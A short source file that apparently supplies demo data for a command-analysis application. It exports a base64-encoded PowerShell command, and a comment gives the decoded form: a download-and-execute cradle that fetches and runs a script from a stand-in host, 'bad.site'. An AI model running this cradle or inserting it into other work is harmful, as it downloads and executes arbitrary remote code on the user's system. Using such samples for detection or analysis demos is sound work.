/**
 * Example commands for the application
 * These commands are used for demonstration purposes and don't count towards user quotas
 */

export const EXAMPLE_ENCODED_COMMAND = 'powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGIAYQBkAC4AcwBpAHQAZQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA';

// Decoded version (for reference):
// IEX(New-Object Net.WebClient).DownloadString('http://bad.site/payload.ps1')

export const EXAMPLE_COMMAND_DESCRIPTION = "Example: powershell -EncodedCommand \"SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAA......";
